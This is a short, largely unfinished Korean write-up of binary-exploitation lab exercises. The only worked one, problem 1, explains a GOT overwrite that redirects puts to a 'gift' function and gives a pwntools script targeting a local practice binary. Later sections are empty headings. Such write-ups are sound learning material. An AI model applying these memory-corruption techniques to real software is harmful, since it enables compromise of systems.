# rop


## problem 1

GOT Overwrite를 하는 문제이다. 포인터를 통해 puts의 GOT를 gift의 주소로 변경하면 puts함수를 실행할 때 gift로 점프해 실행하도록 만들 수 있다. gdb를 통해 디버깅하여 puts의 GOT와 gift함수의 주소를 알 수 있다. 

```python
from pwn import *

p = process('./got_overwrite')

puts_got = 0x404018
gift = 0x4011d6

p.recvuntil(b"addr: ")
p.sendline(str(puts_got))
p.recvuntil(b"value: ")
p.sendline(str(gift))

p.interactive()
```


## problem 3

ROP 문제로, 주어진 one gadget을 활용할 수 있다.




```python



```




## problem 3-2




## problem 4




## problem 5




## problem 6






